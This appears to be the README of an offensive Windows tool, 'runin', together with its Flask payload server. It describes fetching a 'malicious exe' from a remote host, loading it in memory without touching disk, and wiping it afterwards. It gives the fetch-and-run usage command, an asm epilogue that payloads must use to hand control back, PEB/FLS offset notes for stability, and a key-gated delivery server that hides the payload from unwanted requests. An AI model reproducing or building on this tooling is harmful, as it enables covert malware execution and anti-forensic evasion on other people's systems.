# runin

runin is a tool for in-memory and file-less execution of malicious exe within host exe context and wiping any leftover from memory afterwards. 
The tool accomplishes that by getting the malicious exe from a remote server using HTTPS connection, and loading the malicious exe to the host exe process context same as os loader does but after execution of the malcious exe the execution will return to the host and the malicious exe will be wiped from memory.<br/><br/>


## runin
The host process.

runin will execute any exe (except for exe that uses com objects, as there is a problem loading the com libraries before execution) within it's context, in order to an exe to return execution to runin.exe context after the desired exe was executed, the main function of the code needs to be a naked function (i.e. declare it using ```__declspec( naked ) int main(...)``` and it needs simply end with:

```
__asm {
	add esp, <size of variables defined> // clean the new stack
	leave
	ret
}
```

As seen in the example exe (make sure to compile the malicious exe with static linking option).<br/><br/>


Execution: ```runin.exe <remote_server_ip_addr>```\
runin recieves one commandline argument, the ip of the remote http server that will send the malicious exe.

IMPORTANT NOTE - runin handles the case of os accessing fibers created by the malcious exe by freeing the fibers before main function ends and returns (all this stuff is barely documented so i will not go into details, if you wish to know more contact me), it does that by accessing the peb struct FlsHighIndex value, so if you want to runin not to crash when runin exits the process normally (i.e. after our code was completed, meaning after main returns) make sure that the complete peb struct is up to date, or the offset of FlsHighIndex is correct.
up to windows 10 1903 the member FlsHighIndex was a part of the PEB structure, but it was removed from the PEB in windows 10 1903. in a build of windows after 1903 we will access the struct _RTLP_FLS_CONTEXT which resids in ntdll module. more info in the code itself.<br/><br/>

## server.py
A simple http server to send the malicious exe when a specific request is made (combiniation of user agent, url and post request and a key).

Execution: ```server.py <malicious_exe_path>```\
server.py recieves one commandline argument, the malicious exe path to distribute.
The server uses flask (install using ```pip install flask```).<br/><br/>

## RuninTestExe
Simple example exe to show the funcionality of the tool, displays a message box and then returns execution to runin.exe<br/><br/><br/>





### Fibers Info
why the fibers error happens\
https://devblogs.microsoft.com/oldnewthing/20191011-00/?p=102989
http://www.open-std.org/JTC1/SC22/WG21/docs/papers/2018/p1364r0.pdf
https://ntquery.wordpress.com/2014/03/29/anti-debug-fiber-local-storage-fls/#more-18